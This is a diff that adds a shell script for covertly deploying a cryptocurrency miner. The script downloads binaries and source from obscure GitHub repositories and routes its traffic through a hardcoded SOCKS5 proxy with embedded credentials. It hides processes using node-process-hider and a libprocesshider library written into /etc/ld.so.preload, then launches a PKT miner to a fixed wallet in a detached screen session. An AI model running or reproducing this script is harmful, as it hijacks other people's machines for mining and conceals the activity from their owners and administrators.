@@ -1,0 +1,62 @@
+#!/bin/sh
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+sudo apt install gcc screen -y
+curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
+sudo apt install nodejs -y
+npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add golang
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233 
+loglevel = 1 
+socks5 = 216.189.46.232:12324 
+socks5_username = 4ac990d97e91
+socks5_password = 0e15837b19 
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+echo "**"
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://github.com/danipedrosang/marcrash/raw/main/golang
+
+chmod +x golang
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip
+
+unzip pepek.zip
+
+make
+
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+
+mv libprocesshider.so /usr/local/lib/
+
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp screen -dmS run ./golang ann -p pkt1q8prmfshgchvw8s0mzglxkj4cec0ecu78j8mc5e http://pool.pkt.world http://pool.pkteer.com http://pool.pktpool.io -t 1
